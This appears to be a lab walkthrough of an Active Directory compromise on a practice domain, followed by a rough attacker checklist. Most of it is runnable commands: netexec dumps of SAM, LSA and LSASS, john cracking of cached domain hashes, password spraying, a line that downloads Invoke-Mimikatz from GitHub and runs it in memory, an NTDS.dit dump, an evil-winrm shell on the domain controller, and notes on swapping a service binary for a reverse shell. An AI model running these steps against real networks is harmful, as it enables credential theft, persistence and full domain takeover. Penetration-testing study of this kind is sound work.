    **Why**Confirms from Kali that clee now has SYSTEM-level execution on CLIENT-2 after the group change.
    
12. 12Dump CLIENT-2 remotely and crack mross_47:48_
    
    Now that clee is admin on CLIENT-2 we loot it from Kali with netexec. --sam pulls the local hashes, and --lsa dumps cached domain credentials (DCC2), including an mross cached cred. We save the mross hash into a file and also run --lsa secdump, which is the method that reliably surfaces it. Two LSASS modules, lsassy and nanodump, both return David's NT hash.
    
    In BloodHound we check clee and mross: neither has any outbound control, so the chain continues by reusing passwords, not graph edges. john cracks the mross DCC2 hash against rockyou (format mscash2), giving mross's password, which we add to the notes. We also append David's NT hash to a file with the cheat-sheet nanodump one-liner.
    
    Kali
    
    ```
    netexec smb ips -u clee -p '!!XzUfrog69' --sam
    ```
    
    Copy
    
    Dumps the local SAM of the hosts clee is admin on. On CLIENT-2 it returns the Administrator, David and WDAGUtilityAccount hashes.
    
    **Why**Remote SAM dumping is faster than doing it on the box and writes the hashes to netexec's database for reuse.
    
    Kali
    
    ```
    netexec smb 192.168.98.196 -u clee -p '!!XzUfrog69' --lsa
    ```
    
    Copy
    
    Dumps LSA secrets from CLIENT-2, including cached domain credentials in DCC2 form for mross and clee.
    
    **Why**Cached domain creds (DCC2) are crackable offline, and mross is a domain account we do not yet control, so its hash is the next pivot.
    
    Kali
    
    ```
    gedit hash2
    ```
    
    Copy
    
    Opens a scratch file to paste the mross DCC2 hash into.
    
    **Why**john reads the hash from a file, so we stage it before cracking.
    
    Kali
    
    ```
    netexec smb 192.168.98.196 -u clee -p '!!XzUfrog69' --lsa secdump
    ```
    
    Copy
    
    Dumps LSA with the secdump method, which reliably surfaces the mross and clee DCC2 cached credentials plus machine keys.
    
    **Why**The secdump method is the one that cleanly produces the mross DCC2 line we crack.
    
    Kali
    
    ```
    netexec smb 192.168.98.196 -u clee -p '!!XzUfrog69' -M lsassy
    ```
    
    Copy
    
    Runs the lsassy module to read secrets from the LSASS process remotely. It returns CLIENT-2\David's NT hash.
    
    **Why**LSASS can hold credentials the SAM does not, so we check it with a second method to confirm David's hash.
    
    Kali
    
    ```
    netexec smb 192.168.98.196 -u clee -p '!!XzUfrog69' -M nanodump
    ```
    
    Copy
    
    Uses nanodump to dump LSASS, transfer the minidump back and parse it, returning the same David NT hash.
    
    **Why**nanodump is a stealthier LSASS dumper, and getting the same David hash confirms the reading.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash2
    ```
    
    Copy
    
    Cracks the mross DCC2 cached credential with rockyou. john detects the mscash2 format.
    
    **Why**DCC2 is slow but crackable offline, and recovering mross's password lets us spray it across the domain.
    
    Kali
    
    ```
    netexec smb 192.168.98.196 -u clee -p '!!XzUfrog69' --sam
    ```
    
    Copy
    
    Re-dumps the CLIENT-2 SAM, confirming David is a local-only account whose NT hash matches the LSASS dumps.
    
    **Why**We cross-check the local hashes once more before moving on.
    
    Kali
    
    ```
    netexec smb 192.168.98.196 -u clee -p '!!XzUfrog69' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt
    ```
    
    Copy
    
    Dumps LSASS again and pipes the output through fgrep and awk to keep only the hash field, appending it to dumped_hashes.txt.
    
    **Why**Straight from our cheat sheet, it builds a clean file of only the hashes for later brute-forcing.
    
13. 13Spray the creds and reach CLIENT-1_57:36_
    
    We now have three passwords: egreen's, clee's and the cracked mross. We put them in a pass file next to the users file and spray with netexec. The first run reports one valid login per host; mross works everywhere and is Pwn3d on CLIENT-1. We re-run with --continue-on-success to see the full matrix, then narrow to mross to confirm admin on CLIENT-1 and run whoami /all remotely, which shows SeImpersonatePrivilege on CLIENT-1.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass
    ```
    
    Copy
    
    Sprays every username in the users file against every password in the pass file across the three hosts. Without --continue-on-success it stops at the first valid login per host.
    
    **Why**Password reuse is common, so we try the collected passwords against all accounts. mross:password is Pwn3d on CLIENT-1.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray but keeps going after the first hit, printing every valid user and password pair per host.
    
    **Why**We want the full picture of which credential works where, not only the first match on each box.
    
    Kali
    
    ```
    netexec smb ips -u mross -p '!!TWIZtid11'
    ```
    
    Copy
    
    Validates mross across the three hosts. It is valid on all three and Pwn3d on CLIENT-1.
    
    **Why**We narrow the spray to the one account with admin to confirm the CLIENT-1 foothold cleanly.
    
    Kali
    
    ```
    netexec smb ips -u mross -p '!!TWIZtid11' -X 'whoami /all'
    ```
    
    Copy
    
    Runs whoami /all on the hosts through netexec's -X PowerShell execution.
    
    **Why**Confirms our effective rights on each host; on CLIENT-1 the output shows admin privileges.
    
14. 14Loot CLIENT-1 and crack zmiller_1:00:00_
    
    mross is local admin on CLIENT-1, so we loot it. whoami /all over WinRM shows SeImpersonatePrivilege. The SAM dump only has the blank Administrator hash, so we go after LSA and LSASS. lsassy is not supported over WinRM and finds nothing over SMB, but nanodump dumps LSASS. --lsa secdump and plain --lsa both return a cached domain credential for zmiller, one of the Domain Admins. We also run Invoke-Mimikatz in memory over SMB.
    
    We save the zmiller DCC2 line to hash3 and crack it with john (mscash2), recovering zmiller's password.
    
    Kali
    
    ```
    netexec winrm ips -u mross -p '!!TWIZtid11' -X 'whoami /all'
    ```
    
    Copy
    
    Runs whoami /all over WinRM as mross. CLIENT-1 shows SeImpersonatePrivilege enabled.
    
    **Why**We read the token over the admin protocol to confirm what mross can do on CLIENT-1.
    
    Kali
    
    ```
    netexec winrm 192.168.98.195 -u mross -p '!!TWIZtid11' --sam
    ```
    
    Copy
    
    Dumps the local SAM of CLIENT-1 over WinRM. The Administrator hash is the empty-password value.
    
    **Why**SAM is the first dump to try, but a blank local admin hash is not useful, so we move to LSA and LSASS.
    
    Kali
    
    ```
    netexec winrm 192.168.98.195 -u mross -p '!!TWIZtid11' -M lsassy
    ```
    
    Copy
    
    Tries the lsassy module over WinRM. netexec reports the module is not supported for winrm.
    
    **Why**This shows lsassy only runs over SMB, so we retry it there.
    
    Kali
    
    ```
    netexec smb 192.168.98.195 -u mross -p '!!TWIZtid11' -M lsassy
    ```
    
    Copy
    
    Runs lsassy over SMB against CLIENT-1. It finds no credentials.
    
    **Why**SMB is the supported protocol, but LSASS has nothing cached here, so we try nanodump next.
    
    Kali
    
    ```
    netexec smb 192.168.98.195 -u mross -p '!!TWIZtid11' -M nanodump
    ```
    
    Copy
    
    Dumps LSASS on CLIENT-1 with nanodump, transferring the minidump back to Kali.
    
    **Why**A second LSASS method to try to pull live secrets off the box.
    
    Kali
    
    ```
    netexec smb 192.168.98.195 -u mross -p '!!TWIZtid11' --lsa secdump
    ```
    
    Copy
    
    Dumps LSA secrets with the secdump method. It returns a cached domain credential for zmiller in DCC2 form.
    
    **Why**Cached domain creds on a workstation can expose higher-privilege accounts, and zmiller is a Domain Admin.
    
    Kali
    
    ```
    netexec smb 192.168.98.195 -u mross -p '!!TWIZtid11' -X 'powershell.exe -c "wget -useb https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1 | iex; Invoke-Mimikatz"'
    ```
    
    Copy
    
    Through netexec -X, downloads nishang's Invoke-Mimikatz, pipes it into iex and runs it in memory on CLIENT-1, dumping LSASS.
    
    **Why**An in-memory mimikatz run over SMB is another way to read secrets without dropping a binary; it surfaces the CLIENT-1$ machine account.
    
    Kali
    
    ```
    netexec smb 192.168.98.195 -u mross -p '!!TWIZtid11' --lsa
    ```
    
    Copy
    
    Runs the plain --lsa dump, which returns the zmiller DCC2 cached credential line we save for cracking.
    
    **Why**This is the run whose DCC2 output we copy into a file for john.
    
    Kali (hash3 file)
    
    ```
    HACK-ACADEMY.LOCAL/zmiller:$DCC2$10240#zmiller#d9136c822b2084fad389e66f858efb54:
    ```
    
    Copy
    
    The zmiller DCC2 cached-credential line we paste into the file hash3.
    
    **Why**john cracks from a file, so we save the single DCC2 line before running it.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash3
    ```
    
    Copy
    
    Cracks the zmiller DCC2 hash with rockyou. john detects mscash2.
    
    **Why**zmiller is a Domain Admin, so recovering this password is the key to the domain controller.
    
    **Other ways**john --show --format=mscash2 hash3 prints the result cleanly if the type detection is ambiguous.
    
15. 15Confirm the path in BloodHound_1:05:20_
    
    While john runs we check the graph. mross is only a domain user with no outbound control. zmiller is different: the node shows a large outbound object-control count, a strong path toward Domain Admin. The Domain Admins group node is Tier Zero with object id ending in -512 and two members. The prebuilt All Domain Admins Cypher query (MATCH p = (t:Group)<-[:MemberOf*1..]-(a) WHERE (a:User or a:Computer) and t.objectid ENDS WITH '-512' RETURN p) matches any user or computer that is a member, directly or through nested groups, of the group whose object id ends in -512, and it lists zmiller and Administrator as the two accounts to aim for.
    
16. 16Take the domain with zmiller_1:06:52_
    
    zmiller is cracked, so we use it. netexec confirms it is Pwn3d on CLIENT-1, then a spray shows it is valid and Pwn3d on all three hosts, including the domain controller. We dump the NTDS.dit from the DC with the --ntds flag, which answers the crash-risk prompt and pulls every domain hash, including krbtgt, the effective end of the domain. Finally we open an evil-winrm shell on the DC as zmiller and confirm who we are. The domain is ours.
    
    Kali
    
    ```
    netexec smb 192.168.98.195 -u zmiller -p '!!WaR1972!!'
    ```
    
    Copy
    
    Validates the cracked zmiller password against CLIENT-1. It returns Pwn3d.
    
    **Why**We confirm the cracked credential works before spraying it wider.
    
    Kali
    
    ```
    netexec smb ips -u zmiller -p '!!WaR1972!!'
    ```
    
    Copy
    
    Sprays zmiller across all three hosts. It is Pwn3d on CLIENT-1, CLIENT-2 and the DC.
    
    **Why**As a Domain Admin, zmiller is admin everywhere, which includes the domain controller.
    
    Kali
    
    ```
    netexec smb 192.168.98.190 -u zmiller -p '!!WaR1972!!' --ntds
    ```
    
    Copy
    
    Dumps the Active Directory database (NTDS.dit) from the DC, extracting every domain account's NTLM hash including krbtgt. It prompts about a possible DC crash first.
    
    **Why**The correct flag is --ntds. Getting krbtgt means full and lasting control of the domain.
    
    **Other ways**impacket-secretsdump zmiller:'!!WaR1972!!'@DC_IP -just-dc-ntlm dumps the same domain hashes over DRSUAPI.
    
    Kali
    
    ```
    evil-winrm -i 192.168.98.190 -u zmiller -p '!!WaR1972!!'
    ```
    
    Copy
    
    Opens an interactive PowerShell shell on the domain controller as zmiller over WinRM.
    
    **Why**A real shell on the DC confirms the compromise and gives a working console on the domain.
    
    DC01 (evil-winrm)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints our identity and groups on the DC. We are hack-academy\zmiller.
    
    **Why**Final confirmation that we are on the domain controller with the Domain Admin account.


KEEP MAKING REPORT OF ALL STEPS
AND KEEP TAKING AS MANY SCREENSHOTS AS YOU CAN

KEEP A MAIN NOTE OF ALL THE CREDENTIALS YOU KEEP GETTING 
Format :
```
ip1
ip2
ip3

domain name 

initial username
initial password

new user
new pass
```

----

add all the three ips to /etc/hosts
```
sudo nano /etc/hosts
```
paste :
```
ip1 <DOMAIN NAME>
ip2 <DOMAIN NAME>
ip3 <DOMAIN NAME>
```

-----

password spray initial creds for all 3 ips 
for both winrm and rdp login

----

collect data for bloodhound 
run bloodhound

mark initial access user as owned
queries : 
1. see all domain admins
2. all kerberoastable users
3. as-rep roastable users

----

do Authenticated LDAP enumeration to find out users

--------

do as-rep roasting
crack hash

---

password spray the new username and passwords for all 3 ips 
for both winrm and rdp login

----

login to user
run powerup

----

Look for services which have

ModifiableFilePermissions : Write attributes
start name : local system

if you have 
seshutdown privilege

you can replace the service binary with something malicious and restart the machine


start type = demand start
service_start_name = local system

```
sc.exe qc <service name>
```

try to start
```
sc.exe start <service name> 
```
see if you have permissions or not


see if we can replace the service binary with our reverse shell 

```
copy .\reverseshell.exe C:<binary path>\keep original.exe name only in last
```

enumerate the service more 

```
sc.exe qc "service name"
```

```
START_TYPE = autostart
```
that means the service will auto start on startup , so we restart the machine
in powershell : 
```
restart-computer
```

remeber to keep listener running to get reverse shell

-----

now we can dump hashes 


```
net localgroup administrators <USERNAME> /add
```

after you dump hashesh of one machine , 

then move on to other lcient id you have the login creds of 

then dump that mahcine hashes 

then next one 

THEN PASSWORD SPRAY ON EVERY IP using smb first